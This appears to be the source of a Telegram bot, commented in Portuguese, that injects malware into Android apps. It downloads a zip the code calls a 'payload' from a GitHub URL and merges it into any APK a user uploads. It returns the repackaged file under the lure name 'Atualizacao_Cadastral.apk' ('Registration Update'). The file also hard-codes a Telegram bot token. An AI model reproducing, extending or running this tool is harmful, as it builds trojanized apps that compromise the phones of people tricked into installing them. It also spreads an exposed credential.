import os, zipfile, tempfile, shutil, logging, io, requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters

TELEGRAM_TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"

# URL do payload no GitHub
PAYLOAD_URL = "https://raw.githubusercontent.com/gabrielgagliardi83-byte/BOT_FINAL_V2/main/update_apk_decriptado.zip"

def baixar_payload():
    try:
        print("📥 Baixando payload...")
        r = requests.get(PAYLOAD_URL)
        if r.status_code == 200:
            print(f"✅ Payload baixado: {len(r.content)} bytes")
            return r.content
        return None
    except Exception as e:
        print(f"❌ Erro: {e}")
        return None

PAYLOAD = baixar_payload()

def transformar_apk(input_path, output_path):
    if PAYLOAD is None:
        raise Exception("Payload não carregado")
    
    with tempfile.TemporaryDirectory() as tmp:
        # Extrair APK original
        with zipfile.ZipFile(input_path, 'r') as z:
            z.extractall(tmp)
        
        # Extrair payload
        with zipfile.ZipFile(io.BytesIO(PAYLOAD), 'r') as z:
            z.extractall(tmp)
        
        # Recompactar
        with zipfile.ZipFile(output_path, 'w') as z:
            for root, _, files in os.walk(tmp):
                for f in files:
                    path = os.path.join(root, f)
                    arcname = os.path.relpath(path, tmp)
                    z.write(path, arcname)
    
    return output_path

async def start(update, context):
    await update.message.reply_text("🤖 Envie um APK para transformar!")

async def handle_apk(update, context):
    await update.message.reply_text("📥 Processando...")
    file = await update.message.document.get_file()
    with tempfile.NamedTemporaryFile(delete=False, suffix='.apk') as f:
        await file.download_to_drive(f.name)
        input_path = f.name
    
    output_path = f"output_{update.message.chat_id}.apk"
    transformar_apk(input_path, output_path)
    
    await update.message.reply_document(
        document=open(output_path, "rb"),
        filename="Atualizacao_Cadastral.apk",
        caption="✅ APK transformado!"
    )
    os.unlink(input_path)
    os.unlink(output_path)

logging.basicConfig(level=logging.INFO)
app = Application.builder().token(TELEGRAM_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
print("🤖 BOT RODANDO!")
app.run_polling()